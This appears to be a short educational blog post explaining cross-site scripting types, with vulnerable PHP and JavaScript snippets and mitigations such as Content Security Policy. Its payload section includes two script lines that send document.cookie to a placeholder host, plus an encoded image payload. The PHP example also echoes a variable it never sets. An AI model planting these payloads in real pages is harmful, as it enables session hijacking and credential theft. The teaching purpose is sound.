---
layout: post
title: What Is XSS?
---

## What Is It?
Cross-Site Scripting (XSS) is a client-side attack that allows an attacker to run arbitrary Javascript on a web site or application. This enables an attacker to do malicious things such as steal cookies which can lead to session hijacking, steal user credentials, or log keystrokes. 
There are a few different types of Cross-Site Scripting. The most common types are reflected, stored or persistent, and DOM-based XSS. There is also a less common version called mutation XSS (mXSS). Being a client-side attack, what they have in common is that a payload exploiting these vulnerabilities needs to be delivered to the user in some fashion. This, typically, means phishing.

The difference between them, for the most part, is self-explanatory. A search function that displays the input entered back onto the page is a good example of reflected XSS. 

Consider the following code snippet:
```
<body>
	<form action=”” method=”get”>
		<input type=”text” name=”search”>
		<input type=”submit” value=”Submit”>
	</form>
```

```php
  <?php
    $query = $_GET['search'];
    echo "Results for: $search"; 
  ?>
```
The XSS payload would be stored within the $query variable and then executed as it is reflected onto the page.
Stored XSS, on the other hand, means the payload is not immediately executed. It will be stored in a database, and upon retrieval will be executed somewhere. This could be the comment section of a blog for example. First, an attacker would submit a XSS payload as a comment. Then, once a user navigates to the post that comment is for, the payload would execute.

DOM-based XSS is where things get tricky. To understand this attack, one must first understand the DOM. This stands for the Document-Object Model. It is a tree-representation of the structure of documents in memory. Essentially, Javascript interacts with and manipulates the HTML on a website through the DOM. 
DOM-based XSS comes into play when Javascript methods such as .innerHTML are used with unsanitized data. 

Consider the following code snippet:
```javascript
let input = post.author;
element.innerHTML = input;
```
Since the input variable is user-supplied, a malicious payload could be supplied. DOM-based XSS can get very complicated so there will be other resources listed at the end that will explain it better. 

## What does it look like?
A XSS payload can be as simple as &lt;script&gt;alert(1)&lt;/script&gt; or as complex as &lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116
&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039
&#0000088&#0000083&#0000083&#0000039&#0000041&gt;.

While Flash and ActiveX can also be vectors for XSS, today, it tends to be javascript. So, any javascript code could potentially be a XSS payload. 
Generally, &lt;script&gt;alert(1)&lt;/script&gt; is used to test for the vulnerability to see if it is exploitable. 

The following code snippets may also be seen:
```
<script>
  let image = new Image(); 
  image.src='http://example.com?c='+document.cookie;
</script>
```
```
<script>
  document.location="http://example.com?c="+document.cookie;
</script>
```
## Mitigations
There are several ways to mitigate against XSS. All of them originate from the same consideration: never trust user input. And none of them should ever be solely relied upon.

A well-configured Content-Security Policy (CSP) can be a great step towards preventing XSS. It defines trust boundaries for scripts, stylesheets and other media sources. 

Input validation and sanitization are also excellent options. Input validation is the process of ensuring the data submitted is what was expected. Input sanitization is the process of removing or manipulating potentially malicious data. 

## Resources
[DOM XSS Explained](https://www.acunetix.com/blog/articles/dom-xss-explained/)

[DOM Based XSS Software Attack](https://owasp.org/www-community/attacks/DOM_Based_XSS)

[What is DOM Based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)

[Content-Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

[Content-Security Policy - Google](https://developers.google.com/web/fundamentals/security/csp/)

[Content-Security Policy: Use Cases](https://beaglesecurity.com/blog/article/content-security-policy.html)
